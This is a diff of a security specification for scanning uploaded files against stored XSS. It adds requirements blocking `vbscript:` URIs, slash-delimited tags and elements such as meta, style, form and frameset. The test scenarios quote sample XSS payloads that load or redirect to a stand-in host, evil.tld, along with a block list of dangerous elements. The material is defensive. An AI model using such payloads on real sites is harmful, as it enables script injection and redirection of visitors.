@@ -1,8 +1,4 @@
-## Purpose
-
-Define the security requirements for content scanning of uploaded files. Uploaded files MUST be scanned for executable content patterns before being persisted, to prevent stored XSS attacks via uploaded files.
-
-## Requirements
+## ADDED Requirements
 
 ### Requirement: Content is scanned before being written to a web-served path
 
@@ -76,6 +72,48 @@ The system SHALL normalize file content before matching it against the malicious
 - **WHEN** a user uploads a plain text, CSV, or JSON file containing no blocked pattern
 - **THEN** the upload is accepted
 
+### Requirement: Reject uploaded files containing `vbscript:` URIs
+
+The system SHALL reject file uploads whose content contains `vbscript:` URIs, matching the schemes already blocked by the SVG parse-based checker.
+
+#### Scenario: Non-SVG with vbscript: in href is rejected
+- **WHEN** a user uploads a non-SVG file containing `<a href="vbscript:msgbox(1)">`
+- **THEN** the system returns `'Potentially malicious content found!'` and does NOT persist the file
+
+### Requirement: Blocked element detection tolerates alternative tag delimiters
+
+The system SHALL treat `/` as a tag-name delimiter in addition to whitespace and `>`, so a blocked element cannot evade detection by using a slash immediately after the tag name.
+
+#### Scenario: Slash-delimited script tag is rejected
+- **WHEN** a user uploads a non-SVG file containing `<script/src="//evil.tld"></script>`
+- **THEN** the system returns `'Potentially malicious content found!'` and does NOT persist the file
+
+### Requirement: Reject additional dangerous elements
+
+The system SHALL reject file uploads whose content contains elements able to navigate, exfiltrate, or load remote active content, in addition to the elements already blocked: `meta`, `style`, `form`, `applet`, `frame`, `frameset`, `link`, `template`, `portal`, `marquee`, and `math`.
+
+#### Scenario: Meta refresh redirect is rejected
+- **WHEN** a user uploads a non-SVG file containing `<meta http-equiv="refresh" content="0;url=//evil.tld">`
+- **THEN** the system returns `'Potentially malicious content found!'` and does NOT persist the file
+
+#### Scenario: Style element with remote import is rejected
+- **WHEN** a user uploads a non-SVG file containing `<style>@import "//evil.tld/x.css";</style>`
+- **THEN** the system returns `'Potentially malicious content found!'` and does NOT persist the file
+
+#### Scenario: Form with remote action is rejected
+- **WHEN** a user uploads a non-SVG file containing `<form action="//evil.tld">`
+- **THEN** the system returns `'Potentially malicious content found!'` and does NOT persist the file
+
+#### Scenario: Applet element is rejected
+- **WHEN** a user uploads a non-SVG file containing `<applet code="Evil.class">`
+- **THEN** the system returns `'Potentially malicious content found!'` and does NOT persist the file
+
+#### Scenario: Frameset and frame elements are rejected
+- **WHEN** a user uploads a non-SVG file containing `<frameset><frame src="//evil.tld">`
+- **THEN** the system returns `'Potentially malicious content found!'` and does NOT persist the file
+
+## MODIFIED Requirements
+
 ### Requirement: Reject uploaded files with event handler attributes
 
 The system SHALL reject file uploads whose content contains known executable event handler attributes before storing or persisting the file. Rejection SHALL leave no copy of the file on disk, including the copy in the upload staging directory.
@@ -122,53 +160,3 @@ The system SHALL reject file uploads whose content contains `javascript:` URIs i
 #### Scenario: Non-SVG with javascript: in href is rejected
 - **WHEN** a user uploads a non-SVG file containing `javascript:` in an href or src attribute
 - **THEN** the system returns `'Potentially malicious content found!'` and does NOT persist the file
-
-### Requirement: Reject uploaded files containing `vbscript:` URIs
-
-The system SHALL reject file uploads whose content contains `vbscript:` URIs, matching the schemes already blocked by the SVG parse-based checker.
-
-#### Scenario: Non-SVG with vbscript: in href is rejected
-- **WHEN** a user uploads a non-SVG file containing `<a href="vbscript:msgbox(1)">`
-- **THEN** the system returns `'Potentially malicious content found!'` and does NOT persist the file
-
-### Requirement: Blocked element detection tolerates alternative tag delimiters
-
-The system SHALL treat `/` as a tag-name delimiter in addition to whitespace and `>`, so a blocked element cannot evade detection by using a slash immediately after the tag name.
-
-#### Scenario: Slash-delimited script tag is rejected
-- **WHEN** a user uploads a non-SVG file containing `<script/src="//evil.tld"></script>`
-- **THEN** the system returns `'Potentially malicious content found!'` and does NOT persist the file
-
-### Requirement: Reject additional dangerous elements
-
-The system SHALL reject file uploads whose content contains elements able to navigate, exfiltrate, or load remote active content, in addition to the elements already blocked: `meta`, `style`, `form`, `applet`, `frame`, `frameset`, `link`, `template`, `portal`, `marquee`, and `math`.
-
-#### Scenario: Meta refresh redirect is rejected
-- **WHEN** a user uploads a non-SVG file containing `<meta http-equiv="refresh" content="0;url=//evil.tld">`
-- **THEN** the system returns `'Potentially malicious content found!'` and does NOT persist the file
-
-#### Scenario: Style element with remote import is rejected
-- **WHEN** a user uploads a non-SVG file containing `<style>@import "//evil.tld/x.css";</style>`
-- **THEN** the system returns `'Potentially malicious content found!'` and does NOT persist the file
-
-#### Scenario: Form with remote action is rejected
-- **WHEN** a user uploads a non-SVG file containing `<form action="//evil.tld">`
-- **THEN** the system returns `'Potentially malicious content found!'` and does NOT persist the file
-
-#### Scenario: Applet element is rejected
-- **WHEN** a user uploads a non-SVG file containing `<applet code="Evil.class">`
-- **THEN** the system returns `'Potentially malicious content found!'` and does NOT persist the file
-
-#### Scenario: Frameset and frame elements are rejected
-- **WHEN** a user uploads a non-SVG file containing `<frameset><frame src="//evil.tld">`
-- **THEN** the system returns `'Potentially malicious content found!'` and does NOT persist the file
-
-### Requirement: Safe file scanning does not consume the IO stream
-
-After scanning for malicious content, the file pointer SHALL be rewound so subsequent consumers can read the full content.
-
-*(Unchanged — applies to all file types)*
-
-#### Scenario: Tempfile is readable after scan
-- **WHEN** the system scans a Tempfile for unsafe content and the scan passes
-- **THEN** the Tempfile pointer is at the beginning and the full content can be read again
